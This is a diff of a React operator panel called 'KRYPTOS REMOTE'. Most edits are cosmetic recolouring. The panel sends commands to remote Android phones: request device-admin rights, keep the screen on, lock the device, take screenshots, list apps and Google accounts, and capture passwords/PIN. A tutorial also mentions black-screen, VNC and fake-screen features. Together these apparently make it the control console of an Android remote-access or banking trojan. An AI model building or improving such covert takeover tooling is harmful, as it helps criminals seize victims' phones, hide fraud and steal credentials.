+              className="w-full py-3 bg-gradient-to-r from-[#ef4444] via-[#84cc16] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md font-black uppercase tracking-widest text-xs shadow-[0_0_20px_rgba(239,68,68,0.5)] transition-all transform hover:-translate-y-0.5"
             >
-              † Voltar ao Dashboard
+               Voltar ao Dashboard
             </button>
           </div>
         </div>
       )}
       
-      {/* 🚀 CYBER HUD NAVBAR HEADER */}
-      <header className="hud-glass-card border-b border-cyan-500/20 sticky top-0 z-30 shadow-2xl backdrop-blur-2xl">
+      {/*  CYBER HUD NAVBAR HEADER */}
+      <header className="hud-glass-card border-b border-[#2a2a31]/20 sticky top-0 z-30 shadow-2xl backdrop-blur-2xl">
         <div className="w-full px-3 sm:px-5 lg:px-6">
           <div className="flex justify-between items-center h-16">
             <div className="flex items-center space-x-4">
               <button
                 onClick={() => navigate('/dashboard')}
-                className="p-2.5 hud-btn-action rounded-xl text-slate-300 hover:text-cyan-400 transition-all border border-slate-700/60 hover:border-cyan-500/50 shadow-md"
+                className="p-2.5 hud-btn-action rounded-md text-slate-300 hover:text-[#ef4444] transition-all border border-[#2a2a31]/60 hover:border-[#2a2a31]/50 shadow-md"
                 title="Voltar ao Painel"
               >
                 <ArrowLeft className="w-5 h-5" />
               </button>
-              <div className="flex items-center space-x-3 border-r border-slate-800 pr-4">
+              <div className="flex items-center space-x-3 border-r border-[#24242a] pr-4">
                 <div className="flex items-center gap-2.5">
                   <img
                     src="/gangstar-logo.svg?v=2"
@@ -4583,20 +4647,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     className="w-7 h-7 flex-shrink-0"
                     style={{ filter: 'drop-shadow(0 0 10px rgba(255, 43, 43, 0.9))' }}
                   />
-                  <span className="text-lg font-black bg-gradient-to-r from-cyan-300 via-sky-400 to-blue-500 bg-clip-text text-transparent tracking-wide drop-shadow-[0_0_12px_rgba(255,107,107,0.7)] font-sans uppercase">
+                  <span className="text-lg font-black bg-gradient-to-r from-[#fca5a5] via-[#f87171] to-[#ef4444] bg-clip-text text-transparent tracking-wide drop-shadow-[0_0_12px_rgba(190,242,100,0.7)] font-sans uppercase">
                     KRYPTOS REMOTE
                   </span>
                 </div>
               </div>
               
               <div className="flex items-center gap-2">
-                <div className="bg-slate-950/90 border border-cyan-500/30 text-cyan-200 px-3 py-1 rounded-xl text-xs font-mono font-bold shadow-inner flex items-center gap-2">
-                  <Smartphone className="w-3.5 h-3.5 text-cyan-400" />
+                <div className="bg-slate-950/90 border border-[#2a2a31]/30 text-[#e8e8ea] px-3 py-1 rounded-md text-xs font-mono font-bold shadow-inner flex items-center gap-2">
+                  <Smartphone className="w-3.5 h-3.5 text-[#ef4444]" />
                   <span>{device.custom_name ? device.custom_name.toUpperCase() : device.model}</span>
                 </div>
                 <button
                   onClick={handleRename}
-                  className="p-1.5 hover:bg-cyan-950/50 rounded-lg transition-colors text-slate-400 hover:text-cyan-300 border border-transparent hover:border-cyan-500/30"
+                  className="p-1.5 hover:bg-[#121214]/50 rounded-md transition-colors text-slate-400 hover:text-[#ef4444] border border-transparent hover:border-[#2a2a31]/30"
                   title="Renomear Aparelho"
                 >
                   
@@ -4607,7 +4671,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               <div className={`px-3.5 py-1 rounded-full text-xs font-bold flex items-center gap-2 font-mono ${
                 device.is_online 
                   ? 'bg-emerald-950/60 border border-emerald-500/40 text-emerald-400 shadow-[0_0_12px_rgba(16,185,129,0.25)]' 
-                  : 'bg-red-950/60 border border-red-500/40 text-red-400 animate-pulse'
+                  : 'bg-[#121214]/60 border border-[#2a2a31]/40 text-[#ef4444] animate-pulse'
               }`}>
                 <span className={device.is_online ? 'neon-dot-online' : 'neon-dot-offline'} />
                 <span>{device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
@@ -4616,7 +4680,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               {/* Status Admin */}
               <div className={`px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1.5 font-mono ${
                 device.admin_active 
-                  ? 'bg-purple-950/60 text-purple-300 border border-purple-500/40 shadow-[0_0_12px_rgba(239,68,68,0.25)]' 
+                  ? 'bg-purple-950/60 text-[#fca5a5] border border-[#f87171]/40 shadow-[0_0_12px_rgba(239,68,68,0.25)]' 
                   : 'bg-amber-950/40 text-amber-400 border border-amber-500/30'
               }`}>
                 <ShieldAlert className="w-3.5 h-3.5" />
@@ -4625,23 +4689,23 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             </div>
 
             <div className="flex items-center space-x-3">
-              {/* 🔍 Seletor de Zoom do Painel */}
-              <div className="flex items-center bg-[#2e0903]/90 border border-cyan-500/30 rounded-xl px-2 py-1 gap-1 shadow-inner">
+              {/*  Seletor de Zoom do Painel */}
+              <div className="flex items-center bg-[#2e0903]/90 border border-[#2a2a31]/30 rounded-md px-2 py-1 gap-1 shadow-inner">
                 <button
                   type="button"
                   onClick={() => handleZoomChange(panelZoom - 10)}
-                  className="px-1.5 py-0.5 rounded hover:bg-cyan-500/20 text-cyan-300 font-bold text-xs font-mono transition-all"
+                  className="px-1.5 py-0.5 rounded hover:bg-[#ef4444]/20 text-[#ef4444] font-bold text-xs font-mono transition-all"
                   title="Diminuir Zoom (-10%)"
                 >
                   -
                 </button>
-                <span className="text-[11px] font-mono font-black text-cyan-200 w-10 text-center select-none">
+                <span className="text-[11px] font-mono font-black text-[#e8e8ea] w-10 text-center select-none">
                   {panelZoom}%
                 </span>
                 <button
                   type="button"
                   onClick={() => handleZoomChange(panelZoom + 10)}
-                  className="px-1.5 py-0.5 rounded hover:bg-cyan-500/20 text-cyan-300 font-bold text-xs font-mono transition-all"
+                  className="px-1.5 py-0.5 rounded hover:bg-[#ef4444]/20 text-[#ef4444] font-bold text-xs font-mono transition-all"
                   title="Aumentar Zoom (+10%)"
                 >
                   +
@@ -4650,7 +4714,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     type="button"
                     onClick={() => handleZoomChange(100)}
-                    className="text-[9px] font-mono text-cyan-400/80 hover:text-white px-1 ml-0.5 bg-cyan-950/60 rounded border border-cyan-500/30 transition-all"
+                    className="text-[9px] font-mono text-[#ef4444]/80 hover:text-white px-1 ml-0.5 bg-[#121214]/60 rounded border border-[#2a2a31]/30 transition-all"
                     title="Redefinir Zoom (100%)"
                   >
                     100%
@@ -4659,10 +4723,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
 
               <LanguageSelector />
-              {/* 🤖 Botão Robô Assistente */}
+              {/*  Botão Robô Assistente */}
               <button
                 onClick={() => setShowRobotTutorial(true)}
-                className="flex items-center space-x-2 px-3.5 py-2 rounded-xl bg-gradient-to-r from-cyan-950/90 via-[#440e03] to-blue-950/90 border border-cyan-400/60 hover:border-cyan-300 text-cyan-300 hover:text-white text-xs font-bold uppercase tracking-wider transition-all font-mono shadow-[0_0_15px_rgba(255,43,43,0.3)] hover:shadow-[0_0_25px_rgba(255,43,43,0.6)] transform hover:scale-105 active:scale-95"
+                className="flex items-center space-x-2 px-3.5 py-2 rounded-md bg-gradient-to-r from-[#121214]/90 via-[#440e03] to-[#121214]/90 border border-[#3a3a44]/60 hover:border-[#4a4a56] text-[#ef4444] hover:text-white text-xs font-bold uppercase tracking-wider transition-all font-mono shadow-[0_0_15px_rgba(239,68,68,0.3)] hover:shadow-[0_0_25px_rgba(239,68,68,0.6)] transform hover:scale-105 active:scale-95"
                 title="Abrir Tutorial do Robô Assistente (Tela Preta, VNC, Telas Fake)"
               >
                 <RobotAvatar size={20} isFloating theme="cyan" />
@@ -4678,20 +4742,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     setIsFloatingMode(false);
                   }
                 }}
-                className={`flex items-center space-x-2 px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all font-mono ${
+                className={`flex items-center space-x-2 px-4 py-2 rounded-md text-xs font-bold uppercase tracking-wider transition-all font-mono ${
                   isFloatingMode 
                     ? 'hud-pill-active shadow-[0_0_15px_rgba(239,68,68,0.4)]' 
                     : 'hud-btn-action text-slate-300 hover:text-white'
                 }`}
                 title="Modo Flutuante Inovador - Alinha VNC, Screen V2 e Controles automaticamente"
               >
-                <Layout className="w-4 h-4 text-cyan-400" />
+                <Layout className="w-4 h-4 text-[#ef4444]" />
                 <span>{isFloatingMode ? '🪟 MODO FLUTUANTE HUD' : '🪟 MODO FLUTUANTE'}</span>
               </button>
               
               <button
                 onClick={onLogout}
-                className="flex items-center space-x-2 px-4 py-2 bg-gradient-to-r from-red-600 via-rose-600 to-red-700 hover:from-red-500 hover:to-rose-500 text-white rounded-xl text-xs font-bold uppercase tracking-wider transition-all shadow-[0_0_15px_rgba(239,68,68,0.35)] transform hover:-translate-y-0.5"
+                className="flex items-center space-x-2 px-4 py-2 bg-gradient-to-r from-[#ef4444] via-[#84cc16] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold uppercase tracking-wider transition-all shadow-[0_0_15px_rgba(239,68,68,0.35)] transform hover:-translate-y-0.5"
               >
                 <LogOut className="w-4 h-4" />
                 <span>SAIR</span>
@@ -4711,8 +4775,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           {/* ===== COLUNA ESQUERDA: Central de Comando & Permissões (Visual Renovado VIP) ===== */}
           <div className="space-y-3.5 order-2 lg:order-1">
 
-            {/* ›¡ CARD 1: CENTRAL DE PERMISSÕES & ADMIN (DESIGN HIGHLIGHTED VIP) */}
-            <div id="tour-admin-perms" className="bg-gradient-to-b from-[#380b04]/95 via-[#2c0903]/90 to-[#1c0503]/95 border border-amber-500/30 shadow-[0_0_25px_rgba(245,158,11,0.12)] rounded-2xl p-4 transition-all hover:border-amber-400/50 relative overflow-hidden group">
+            {/* ¡ CARD 1: CENTRAL DE PERMISSÕES & ADMIN (DESIGN HIGHLIGHTED VIP) */}
+            <div id="tour-admin-perms" className="bg-gradient-to-b from-[#380b04]/95 via-[#2c0903]/90 to-[#1c0503]/95 border border-amber-500/30 shadow-[0_0_25px_rgba(245,158,11,0.12)] rounded-md p-4 transition-all hover:border-amber-400/50 relative overflow-hidden group">
               <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-amber-500/10 via-amber-400 to-amber-500/10"></div>
               
               <div className="flex items-center justify-between mb-3.5">
@@ -4726,7 +4790,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
 
               {/* Status Indicator Bar */}
-              <div className="bg-[#170503]/80 rounded-xl p-2.5 border border-amber-500/20 mb-3 flex items-center justify-between">
+              <div className="bg-[#170503]/80 rounded-md p-2.5 border border-amber-500/20 mb-3 flex items-center justify-between">
                 <div className="flex items-center gap-2">
                   <div className="w-2.5 h-2.5 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)] animate-pulse" />
                   <span className="text-[11px] font-bold text-slate-200">{t('panel.device_admin')}</span>
@@ -4734,10 +4798,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 <button
                   id="btn-check-admin-status"
                   onClick={handleCheckAdminStatus}
-                  className="px-2.5 py-1 bg-blue-950/40 border border-blue-500/30 hover:border-blue-400 hover:bg-blue-900/40 text-blue-400 rounded-lg text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-1"
+                  className="px-2.5 py-1 bg-[#121214]/40 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#1a1a1e]/40 text-[#ef4444] rounded-md text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-1"
                   title="Verifica se o Administrador de Dispositivo está ativo"
                 >
-                  <RefreshCw className="w-3 h-3 text-blue-400" />
+                  <RefreshCw className="w-3 h-3 text-[#ef4444]" />
                   {t('panel.status')}
                 </button>
               </div>
@@ -4747,7 +4811,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 <button
                   id="btn-request-admin"
                   onClick={handleRequestAdminPermission}
-                  className="w-full py-2.5 bg-gradient-to-r from-amber-600/30 via-orange-600/30 to-amber-700/30 border border-amber-500/50 hover:border-amber-400 hover:from-amber-600/45 hover:to-orange-600/45 text-amber-300 rounded-xl font-black uppercase tracking-wider text-xs transition-all shadow-[0_0_15px_rgba(245,158,11,0.15)] flex items-center justify-center gap-2"
+                  className="w-full py-2.5 bg-gradient-to-r from-amber-600/30 via-[#84cc16]/30 to-amber-700/30 border border-amber-500/50 hover:border-amber-400 hover:from-amber-600/45 hover:to-[#84cc16]/45 text-amber-300 rounded-md font-black uppercase tracking-wider text-xs transition-all shadow-[0_0_15px_rgba(245,158,11,0.15)] flex items-center justify-center gap-2"
                   title="Abre a tela de ativação de Administrador no aparelho"
                 >
                   <ShieldAlert className="w-4 h-4 text-amber-400" />
@@ -4760,10 +4824,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-configure-rom']}
                   onStyleChange={(style) => updateButtonStyle('btn-configure-rom', style)}
-                  className="w-full py-2 bg-[#330b04]/80 border border-cyan-500/30 hover:border-cyan-400 hover:bg-cyan-950/30 text-cyan-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
+                  className="w-full py-2 bg-[#330b04]/80 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#121214]/30 text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                   title="Configura Autostart, Otimização de Bateria, Permissões de Sistema"
                 >
-                  <Sliders className="w-4 h-4 text-cyan-400" /> {t('panel.optimize_rom')}
+                  <Sliders className="w-4 h-4 text-[#ef4444]" /> {t('panel.optimize_rom')}
                 </EditableButton>
 
                 <EditableButton
@@ -4772,7 +4836,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-lockscreen']}
                   onStyleChange={(style) => updateButtonStyle('btn-lockscreen', style)}
-                  className="w-full py-2 bg-gradient-to-r from-yellow-600/20 to-amber-600/20 border border-yellow-500/40 hover:border-yellow-300 text-yellow-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
+                  className="w-full py-2 bg-gradient-to-r from-yellow-600/20 to-amber-600/20 border border-yellow-500/40 hover:border-yellow-300 text-yellow-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                 >
                   <Lock className="w-4 h-4 text-yellow-400" /> {t('panel.passwords_pin')}
                 </EditableButton>
@@ -4782,9 +4846,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     onClick={() => {
                       sendCommand({ action: 'SCREEN_PERSISTENCE', enabled: true });
-                      addLog('🔒 Persistência de tela ATIVADA!');
+                      addLog(' Persistência de tela ATIVADA!');
                     }}
-                    className="flex-1 py-2 bg-gradient-to-r from-rose-950/40 to-red-900/40 border border-rose-500/40 hover:border-rose-400 text-rose-300 rounded-xl font-bold uppercase tracking-wider text-[11px] transition-all flex items-center justify-center gap-1.5"
+                    className="flex-1 py-2 bg-gradient-to-r from-rose-950/40 to-[#1a1a1e]/40 border border-[#ef4444]/40 hover:border-rose-400 text-rose-300 rounded-md font-bold uppercase tracking-wider text-[11px] transition-all flex items-center justify-center gap-1.5"
                     title="Mantém a tela sempre acesa"
                   >
                     <Lock className="w-3.5 h-3.5 text-rose-400" /> {t('panel.keep_screen_on')}
@@ -4792,9 +4856,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     onClick={() => {
                       sendCommand({ action: 'SCREEN_PERSISTENCE', enabled: false });
-                      addLog('🔓 Persistência de tela DESATIVADA');
+                      addLog(' Persistência de tela DESATIVADA');
                     }}
-                    className="flex-1 py-2 bg-[#210703] border border-slate-700/60 hover:border-slate-500 text-slate-300 rounded-xl font-bold uppercase tracking-wider text-[11px] transition-all flex items-center justify-center gap-1.5"
+                    className="flex-1 py-2 bg-[#210703] border border-[#2a2a31]/60 hover:border-[#8b8b94] text-slate-300 rounded-md font-bold uppercase tracking-wider text-[11px] transition-all flex items-center justify-center gap-1.5"
                     title="Modo padrão de tela"
                   >
                     <Eye className="w-3.5 h-3.5 text-slate-400" /> {t('panel.normal_mode')}
@@ -4803,12 +4867,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
             </div>
 
-            {/* ⚡ CARD 2: CENTRO DE COMANDO & NAVEGAÇO */}
-            <div className="bg-[#280903]/90 border border-cyan-500/25 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-4 transition-all hover:border-cyan-400/40 relative overflow-hidden group">
-              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400/40 to-transparent"></div>
+            {/*  CARD 2: CENTRO DE COMANDO & NAVEGAÇO */}
+            <div className="bg-[#280903]/90 border border-[#2a2a31]/25 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#3a3a44]/40 relative overflow-hidden group">
+              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/40 to-transparent"></div>
               
-              <h3 className="text-cyan-400 font-black uppercase text-xs tracking-wider mb-3 flex items-center gap-2 font-mono">
-                <Smartphone className="w-4 h-4 text-cyan-400" />
+              <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider mb-3 flex items-center gap-2 font-mono">
+                <Smartphone className="w-4 h-4 text-[#ef4444]" />
                 {t('panel.nav_commands')}
               </h3>
               
@@ -4827,13 +4891,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-power']}
                   onStyleChange={(style) => updateButtonStyle('btn-power', style)}
-                  className={`w-full py-2.5 text-white rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 ${
+                  className={`w-full py-2.5 text-white rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 ${
                     isPowerLongPressed 
-                      ? 'bg-gradient-to-r from-orange-600 to-red-600 scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)]' 
-                      : 'bg-gradient-to-r from-red-950/40 to-rose-950/40 border border-red-500/40 hover:bg-red-900/40 hover:border-red-400 text-red-400 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
+                      ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)]' 
+                      : 'bg-gradient-to-r from-[#121214]/40 to-rose-950/40 border border-[#2a2a31]/40 hover:bg-[#1a1a1e]/40 hover:border-[#3a3a44] text-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.1)]'
                   }`}
                 >
-                  <Power className="w-4 h-4 text-red-400" />
+                  <Power className="w-4 h-4 text-[#ef4444]" />
                   {isPowerLongPressed ? '³ Menu...' : t('panel.toggle_screen')}
                 </EditableButton>
               </div>
@@ -4846,11 +4910,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-back']}
                   onStyleChange={(style) => updateButtonStyle('btn-back', style)}
-                  className="py-2.5 bg-[#3a0c04]/70 border border-blue-500/30 hover:border-cyan-400 hover:bg-[#541206] text-slate-200 rounded-xl font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
+                  className="py-2.5 bg-[#3a0c04]/70 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#541206] text-slate-200 rounded-md font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
                   title="Voltar"
                 >
-                  <ChevronLeft className="w-4 h-4 text-cyan-400" />
-                  <span className="text-[10px] uppercase font-mono tracking-wider">◀ {t('panel.back')}</span>
+                  <ChevronLeft className="w-4 h-4 text-[#ef4444]" />
+                  <span className="text-[10px] uppercase font-mono tracking-wider"> {t('panel.back')}</span>
                 </EditableButton>
                 
                 <EditableButton
@@ -4859,10 +4923,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-home']}
                   onStyleChange={(style) => updateButtonStyle('btn-home', style)}
-                  className="py-2.5 bg-[#3a0c04]/70 border border-blue-500/30 hover:border-cyan-400 hover:bg-[#541206] text-slate-200 rounded-xl font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
+                  className="py-2.5 bg-[#3a0c04]/70 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#541206] text-slate-200 rounded-md font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
                   title="Tela Inicial"
                 >
-                  <span className="w-4 h-4 rounded-full border-2 border-cyan-400/90 flex items-center justify-center text-[9px] font-black text-cyan-300">H</span>
+                  <span className="w-4 h-4 rounded-full border-2 border-[#3a3a44]/90 flex items-center justify-center text-[9px] font-black text-[#ef4444]">H</span>
                   <span className="text-[10px] uppercase font-mono tracking-wider">  {t('panel.home')}</span>
                 </EditableButton>
                 
@@ -4872,30 +4936,30 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-recents']}
                   onStyleChange={(style) => updateButtonStyle('btn-recents', style)}
-                  className="py-2.5 bg-[#3a0c04]/70 border border-blue-500/30 hover:border-cyan-400 hover:bg-[#541206] text-slate-200 rounded-xl font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
+                  className="py-2.5 bg-[#3a0c04]/70 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#541206] text-slate-200 rounded-md font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
                   title="Apps Recentes"
                 >
-                  <LayoutGrid className="w-4 h-4 text-cyan-400" />
-                  <span className="text-[10px] uppercase font-mono tracking-wider">▢ {t('panel.recents')}</span>
+                  <LayoutGrid className="w-4 h-4 text-[#ef4444]" />
+                  <span className="text-[10px] uppercase font-mono tracking-wider"> {t('panel.recents')}</span>
                 </EditableButton>
               </div>
               
               {/* Controle Rápido íícones */}
-              <div className="bg-[#1a0503]/70 p-2 rounded-xl border border-blue-500/15 mb-3">
-                <p className="text-[9px] text-cyan-400/80 font-black mb-1.5 uppercase tracking-widest font-mono text-center">{t('panel.hardware_actions')}</p>
+              <div className="bg-[#1a0503]/70 p-2 rounded-md border border-[#2a2a31]/15 mb-3">
+                <p className="text-[9px] text-[#ef4444]/80 font-black mb-1.5 uppercase tracking-widest font-mono text-center">{t('panel.hardware_actions')}</p>
                 <div className="grid grid-cols-5 gap-1.5">
                   <button
                     type="button"
                     onClick={() => sendCommand({ action: 'VIBRATE' })}
-                    className="py-2 bg-[#330b04] border border-blue-500/20 hover:border-cyan-400 text-slate-300 rounded-lg flex items-center justify-center transition-all"
+                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                     title="Vibrar Celular"
                   >
-                    <Activity className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
+                    <Activity className="w-3.5 h-3.5 text-[#ef4444] animate-pulse" />
                   </button>
                   <button
                     type="button"
                     onClick={() => sendCommand({ action: 'VOLUME_DOWN' })}
-                    className="py-2 bg-[#330b04] border border-blue-500/20 hover:border-cyan-400 text-slate-300 rounded-lg flex items-center justify-center transition-all"
+                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                     title="Volume -"
                   >
                     <Volume1 className="w-3.5 h-3.5 text-slate-300" />
@@ -4903,7 +4967,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     type="button"
                     onClick={() => sendCommand({ action: 'VOLUME_UP' })}
-                    className="py-2 bg-[#330b04] border border-blue-500/20 hover:border-cyan-400 text-slate-300 rounded-lg flex items-center justify-center transition-all"
+                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                     title="Volume +"
                   >
                     <Volume2 className="w-3.5 h-3.5 text-slate-300" />
@@ -4911,7 +4975,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     type="button"
                     onClick={() => sendCommand({ action: 'LOCK_DEVICE' })}
-                    className="py-2 bg-[#330b04] border border-blue-500/20 hover:border-rose-400 text-slate-300 rounded-lg flex items-center justify-center transition-all"
+                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-rose-400 text-slate-300 rounded-md flex items-center justify-center transition-all"
                     title="Bloquear Aparelho"
                   >
                     <Lock className="w-3.5 h-3.5 text-rose-400" />
@@ -4919,10 +4983,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     type="button"
                     onClick={() => sendCommand({ action: 'SNAP_SCREEN' })}
-                    className="py-2 bg-[#330b04] border border-blue-500/20 hover:border-cyan-400 text-slate-300 rounded-lg flex items-center justify-center transition-all"
+                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                     title="Tirar Print"
                   >
-                    <Camera className="w-3.5 h-3.5 text-cyan-400" />
+                    <Camera className="w-3.5 h-3.5 text-[#ef4444]" />
                   </button>
                 </div>
               </div>
@@ -4935,10 +4999,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-notifications']}
                   onStyleChange={(style) => updateButtonStyle('btn-notifications', style)}
-                  className="py-2 bg-[#330b04] border border-blue-500/25 hover:border-cyan-400 text-slate-200 rounded-xl font-bold transition-all flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider font-mono"
+                  className="py-2 bg-[#330b04] border border-[#2a2a31]/25 hover:border-[#3a3a44] text-slate-200 rounded-md font-bold transition-all flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider font-mono"
                   title="Abrir Barra de Notificações"
                 >
-                  <Bell className="w-3.5 h-3.5 text-cyan-400" /> {t('panel.notifications')}
+                  <Bell className="w-3.5 h-3.5 text-[#ef4444]" /> {t('panel.notifications')}
                 </EditableButton>
                 
                 <EditableButton
@@ -4947,20 +5011,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-quick-settings']}
                   onStyleChange={(style) => updateButtonStyle('btn-quick-settings', style)}
-                  className="py-2 bg-[#330b04] border border-blue-500/25 hover:border-cyan-400 text-slate-200 rounded-xl font-bold transition-all flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider font-mono"
+                  className="py-2 bg-[#330b04] border border-[#2a2a31]/25 hover:border-[#3a3a44] text-slate-200 rounded-md font-bold transition-all flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider font-mono"
                   title="Abrir Configurações Rápidas do Celular"
                 >
-                  <Settings className="w-3.5 h-3.5 text-cyan-400" /> {t('panel.quick_config')}
+                  <Settings className="w-3.5 h-3.5 text-[#ef4444]" /> {t('panel.quick_config')}
                 </EditableButton>
               </div>
             </div>
 
-            {/* 🚀 CARD 3: FERRAMENTAS & RECURSOS */}
-            <div className="bg-[#280903]/90 border border-cyan-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-4 transition-all hover:border-cyan-400/50 relative overflow-hidden group">
-              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent"></div>
+            {/*  CARD 3: FERRAMENTAS & RECURSOS */}
+            <div className="bg-[#280903]/90 border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#3a3a44]/50 relative overflow-hidden group">
+              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
               
-              <h3 className="text-cyan-300 font-black uppercase text-xs tracking-wider mb-3 flex items-center gap-2 font-mono">
-                <Package className="w-4 h-4 text-cyan-400" />
+              <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider mb-3 flex items-center gap-2 font-mono">
+                <Package className="w-4 h-4 text-[#ef4444]" />
                 {t('panel.tools_apps')}
               </h3>
 
@@ -4974,7 +5038,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-apps']}
                   onStyleChange={(style) => updateButtonStyle('btn-apps', style)}
-                  className="w-full py-2 bg-gradient-to-r from-emerald-600/20 to-teal-600/20 border border-emerald-500/40 hover:border-emerald-400 text-emerald-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
+                  className="w-full py-2 bg-gradient-to-r from-emerald-600/20 to-teal-600/20 border border-emerald-500/40 hover:border-emerald-400 text-emerald-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                 >
                   <Smartphone className="w-4 h-4 text-emerald-400" /> {t('panel.view_installed_apps')}
                 </EditableButton>
@@ -4988,9 +5052,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-google-accounts']}
                   onStyleChange={(style) => updateButtonStyle('btn-google-accounts', style)}
